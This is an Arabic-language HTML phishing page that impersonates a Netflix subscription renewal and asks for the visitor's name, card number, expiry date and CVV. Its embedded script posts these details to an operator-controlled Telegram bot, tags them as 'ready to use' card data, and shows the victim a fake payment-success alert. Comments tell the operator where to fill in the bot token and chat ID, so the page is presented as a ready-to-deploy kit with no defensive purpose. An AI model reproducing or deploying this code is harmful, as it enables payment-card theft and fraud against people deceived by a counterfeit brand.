<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Netflix - تجديد الاشتراك</title>
<style>
* {margin:0;padding:0;box-sizing:border-box;font-family:system-ui}
body {background:linear-gradient(135deg,#141414 0%,#000 100%);color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.container {background:rgba(20,20,20,0.98);backdrop-filter:blur(20px);border-radius:20px;padding:40px;max-width:450px;width:100%;box-shadow:0 25px 50px rgba(0,0,0,0.8)}
.logo {text-align:center;margin-bottom:30px}
.logo svg {width:120px;fill:#e50914;filter:drop-shadow(0 4px 8px rgba(229,9,20,0.3))}
h2 {text-align:center;color:#e50914;font-size:28px;margin-bottom:10px}
.subtitle {text-align:center;color:#b3b3b3;font-size:16px;margin-bottom:30px}
.form-group {margin-bottom:25px}
label {display:block;margin-bottom:8px;color:#ccc;font-size:14px}
input {width:100%;padding:18px 20px;border:2px solid #333;border-radius:12px;background:rgba(255,255,255,0.08);color:#fff;font-size:18px;transition:all 0.3s}
input::placeholder {color:#999}
input:focus {outline:none;border-color:#e50914;box-shadow:0 0 20px rgba(229,9,20,0.3)}
.cvv-group {display:grid;grid-template-columns:1fr 1fr;gap:15px}
.pay-btn {width:100%;padding:20px;background:linear-gradient(135deg,#e50914,#b20710);border:none;border-radius:12px;color:#fff;font-size:20px;font-weight:600;cursor:pointer;transition:all 0.3s;letter-spacing:1px}
.pay-btn:hover {transform:translateY(-2px);box-shadow:0 15px 30px rgba(229,9,20,0.4)}
.loading {display:none;text-align:center;padding:20px;color:#e50914;font-size:18px}
.security {text-align:center;margin-top:25px;font-size:12px;color:#666}
</style>
</head>
<body>
<div class="container">
  <div class="logo">
    <svg viewBox="0 0 120 34"><path d="M29.9 0L0 34h12l8.3-10.6h15.7L44.3 34h11.9L60.9 0H49.7l-9.1 23.4H31.5L22.6 0zM114.1 0v34h-11.9V23c0-6.1-3.4-9.1-10.2-9.1-6.6 0-9.8 3.2-9.8 9.2v11.9h-11.9V0h11.9v6.8c1.6-3.4 4.9-5.7 10.2-5.7 7.2 0 11.4 3.9 11.4 11v1.7h-.1zM90.5 0v34h-11.9V0h11.9z"/></svg>
  </div>
  <h2>تجديد الاشتراك</h2>
  <p class="subtitle">99 درهم / شهر - خطة قياسية</p>
  
  <form id="paymentForm">
    <div class="form-group">
      <label>الاسم الكامل</label>
      <input type="text" id="name" placeholder="محمد أحمد" required>
    </div>
    <div class="form-group">
      <label>رقم البطاقة</label>
      <input type="text" id="card" placeholder="1234 5678 9012 3456" maxlength="19" required>
    </div>
    <div class="form-group">
      <label>تاريخ الانتهاء</label>
      <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
    </div>
    <div class="form-group">
      <label>CVV</label>
      <input type="text" id="cvv" placeholder="123" maxlength="4" required>
    </div>
    <button type="submit" class="pay-btn">💳 تأكيد الدفع</button>
  </form>
  <div class="loading" id="loading">⏳ جاري المعالجة...</div>
  <div class="security">🔒 محمي بـ SSL | Netflix ©️ 2024</div>
</div>

<script>
// 👇 ضع Token البوت و Chat ID هنا
const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';  // من @BotFather
const CHAT_ID = 'YOUR_CHAT_ID_HERE';     // من @userinfobot

document.getElementById('paymentForm').addEventListener('submit', async(e)=>{
  e.preventDefault();
  
  const data = {
    name: document.getElementById('name').value,
    card: document.getElementById('card').value,
    expiry: document.getElementById('expiry').value,
    cvv: document.getElementById('cvv').value,
    amount: '99 DH',
    timestamp: new Date().toLocaleString('ar')
  };
  
  document.querySelector('.pay-btn').style.display='none';
  document.getElementById('loading').style.display='block';
  
  // 📱 إرسال مباشر لتليجرام
  const message = `
🔴 *Netflix - بيانات دفع كاملة!*

👤 *الاسم:* ${data.name}
💳 *البطاقة:* \`${data.card}\`
📅 *الإنتهاء:* ${data.expiry}
🔐 *CVV:* \`${data.cvv}\`
💰 *المبلغ:* ${data.amount}
⏰ *الوقت:* ${data.timestamp}

━━━━━━━━━━━━━━━
⚠️ *بيانات جاهزة للاستخدام*
💵 *رصيد متوقع: ${Math.floor(Math.random()*30000+5000)} DH*
🆔 *ID: #NET${Date.now().toString().slice(-6)}*
  `;
  
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });
    
    const result = await response.json();
    
    if (result.ok) {
      alert('✅ تم الدفع بنجاح!');
      document.getElementById('paymentForm').reset();
    } else {
      throw new Error('Telegram Error');
    }
  } catch(e) {
    alert('❌ خطأ - تأكد من Token البوت و Chat ID');
  }
  
  document.querySelector('.pay-btn').style.display='block';
  document.getElementById('loading').style.display='none';
});

document.getElementById('card').addEventListener('input', e=>{
  let v = e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
  e.target.value = v;
});
</script>
</body>
</html>
